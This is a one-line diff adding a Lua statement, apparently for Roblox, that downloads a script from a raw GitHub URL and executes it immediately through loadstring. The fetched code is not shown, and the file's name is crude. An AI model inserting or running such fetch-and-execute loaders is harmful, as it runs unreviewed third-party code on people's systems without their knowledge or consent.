@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JoonyWoony/Jooony/main/gay.lua",true))()
